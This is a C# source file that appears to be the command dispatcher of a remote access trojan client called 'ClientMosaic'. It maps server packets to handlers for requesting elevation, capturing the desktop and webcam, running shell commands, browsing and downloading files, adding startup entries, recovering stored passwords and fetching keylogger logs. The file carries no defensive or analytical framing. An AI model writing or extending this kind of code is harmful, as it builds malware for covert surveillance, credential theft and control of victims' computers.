using Client.Controllers;
using Client.Packets.ServerPackets;

namespace Client.Packets
{
    public static class PacketHandler
    {
        public static void packetChecker(ClientMosaic client, IPackets packet)
        {
            var type = packet.Type;

            if(type == TypePackets.DoAskElevate)
            {
                Controllers.Tools.CommandController.doAskElevate((DoAskElevate)packet, client);
            }
            else if (type == TypePackets.GetMonitors)
            {
                RemoteDesktopController.getMonitors(client);
            }
            else if (type == TypePackets.GetDesktop)
            {
                RemoteDesktopController.getDesktop((GetDesktop)packet, client);
            }
            else if (type == TypePackets.GetExecuteShellCmd)
            {
                RemoteShellController.getExecuteShellCmd((GetExecuteShellCmd)packet, client);
            }
            else if (type == TypePackets.GetAvailableWebcams)
            {
                RemoteWebcamController.getAvailableWebcams((GetAvailableWebcams)packet, client);
            }
            else if (type == TypePackets.GetWebcam)
            {
                RemoteWebcamController.getWebcam((GetWebcam)packet, client);
            }
            else if (type == TypePackets.StopWebcam)
            {
                RemoteWebcamController.stopWebcam();
            }
            else if (type == TypePackets.GetDrives)
            {
                FileManagerController.getDrives((GetDrives)packet, client);
            }
            else if(type == TypePackets.GetDirectory)
            {
                FileManagerController.getDirectory((GetDirectory)packet, client);
            }
            else if (type == TypePackets.DoDownloadFile)
            {
                FileManagerController.doDownloadFile((DoDownloadFile)packet, client);
            }
            else if (type == TypePackets.DoDownloadFileCancel)
            {
                FileManagerController.doDownloadFileCancel((DoDownloadFileCancel)packet, client);
            }
            else if(type == TypePackets.GetProcesses)
            {
                TaskManagerController.getProcesses((GetProcesses)packet, client);
            }
            else if(type == TypePackets.GetSysInfo)
            {
                SystemInformationController.getSysInfo(client);
            }
            else if (type == TypePackets.GetStartupItems)
            {
                StartupManagerController.getStartupItems((GetStartupItems)packet, client);
            }
            else if (type == TypePackets.DoStartupItemAdd)
            {
                StartupManagerController.doStartupItemAdd((DoStartupItemAdd)packet, client);
            }
            else if (type == TypePackets.DoStartupItemRemove)
            {
                StartupManagerController.doStartupItemRemove((DoStartupItemRemove)packet, client);
            }
            else if (type == TypePackets.GetPasswords)
            {
                PasswordRecoveryController.getPasswords((GetPasswords)packet, client);
            }
            else if (type == TypePackets.GetKeyLoggerLogs)
            {
                KeyLoggerController.getKeyLogger((GetKeyLoggerLogs)packet, client);
            }
            
        }
    }
}
